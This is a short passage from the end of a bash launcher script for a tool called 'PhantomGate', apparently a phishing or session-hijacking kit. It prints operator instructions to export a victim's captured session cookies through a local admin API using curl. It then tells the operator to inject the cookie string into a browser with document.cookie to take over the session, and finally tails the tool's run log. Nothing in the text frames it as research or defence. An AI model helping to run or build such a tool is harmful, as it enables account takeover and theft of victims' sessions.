echo -e "       ${DIM}Export cookies:${NC} curl -s 'http://127.0.0.1:$ADMIN_PORT/api/sessions/export?victim_id=VICTIM_ID' -H 'X-Admin-Token: $ADMIN_PASS'"
echo -e "       ${DIM}Then paste the cookie_string into browser DevTools > Console:${NC}"
echo -e "       ${DIM}  document.cookie = \"<cookie_string_here>\"${NC}"
echo ""
echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  ${DIM}PhantomGate is running. Press Ctrl+C to stop.${NC}"
echo -e "  ${DIM}Server log: tail -f /tmp/phantomgate_run.log${NC}"
echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

# Stream the server log so the user sees live activity
tail -f /tmp/phantomgate_run.log 2>/dev/null &
PIDS+=($!)
wait
